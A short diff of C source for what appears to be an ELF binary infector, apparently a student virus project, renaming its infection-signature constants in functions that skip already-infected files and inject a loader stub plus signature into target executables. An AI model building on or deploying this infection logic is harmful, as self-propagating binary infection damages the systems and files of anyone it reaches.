@@ -52,7 +52,7 @@ typedef enum {
 	PHT_IDX_PACKER_BSS_RANGES,
 	PHT_IDX_PACKER32_LOAD,
 	PHT_IDX_PACKER64_LOAD,
-	PHT_IDX_FAMINE_SIGN,
+	PHT_IDX_PESTILENCE_SIGN,
 	PHT_IDX__NB,
 }	e_pht_idx;
 
@@ -120,7 +120,7 @@ static void _infect(const char *path, void *ctx) {
 	if (elf_manager_load(&s, path) == EXIT_FAILURE)
 		return ;
 
-	if (strcmp(s.data + s.size - FAMINE_SIGN_LEN, FAMINE_SIGN) == 0) {
+	if (strcmp(s.data + s.size - PESTILENCE_SIGN_LEN, PESTILENCE_SIGN) == 0) {
 		return ;
 	}
 	interp_idx = elf_find_ph_index(&s, elf_ph_is_interp);
@@ -333,7 +333,7 @@ static bool	_inject(
 
 	verbose("append sign...");
 	elf_append_loadable_data_and_locate(s,
-						FAMINE_SIGN, FAMINE_SIGN_LEN, 0x1000, 0x20, first_entry_index + PHT_IDX_FAMINE_SIGN, PF_R);
+						PESTILENCE_SIGN, PESTILENCE_SIGN_LEN, 0x1000, 0x20, first_entry_index + PHT_IDX_PESTILENCE_SIGN, PF_R);
 	verbose("done !\n");
 
 	verbose("populating stub data...");
